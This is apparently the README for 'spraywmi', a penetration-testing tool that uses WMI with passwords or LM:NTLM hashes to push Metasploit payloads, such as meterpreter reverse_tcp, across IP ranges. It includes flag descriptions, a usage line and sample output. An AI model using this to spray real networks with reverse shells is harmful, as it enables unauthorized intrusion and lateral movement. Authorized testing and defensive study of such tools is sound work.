Initial Blog: https://www.trustedsec.com/june-2015/no_psexec_needed/ if you have trouble with this on 64 bit - try:

dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 && apt-get install libpopt0:i386

Flag descriptions:

DOMAIN - domain you are attacking - if its local, just specify workgroup
USERNAME - username to authenticate on the remote Windows system
PASSWORD - password or password hash lm:ntlm to use on the remote Windows system
CIDR_RANGE,CIDR_RANGE or ips.txt - you can specify a single ip, a CIDR range (192.168.1.1/24) or multiple CIDRs such as 192.168.1.1/24,192.168.2.1/24. You can also specify a file (ex: file.txt) which has single IP addresses on a new line. 
METASPLOIT_PAYLOAD - this is the payload you want to use example: windows/meterpreter/reverse_tcp
REVERSE_SHELL_IP - this is the IP address of your attacker machine that you want to create a listener or use an already established listener
REVERSE_SHELL_PORT - port to connect back on for the reverse
OPTIONAL: NO - specify no if you do not want to create a listener - this is useful if you already have a listener established. If you do not specify a value here, it will automatically create a listener for you.

Usage: python spraywmi.py <domain> <username> <password or hash lm:ntlm> <cidr_range,cidr_range or ips.txt> <metasploit_payload> <reverse_shell_ip> <reverse_shell_port> <optional: no>

Below is an example of output from spraywmi:

[*] Generating shellcode through unicorn, could take a few seconds...
[*] Launching the listener in the background...
[*] Waiting for the listener to start first before we continue forward...
[*] Be patient, Metaploit takes a little bit to start...
[*] Sweeping network for ports that are open first, then moving through... Be patient.
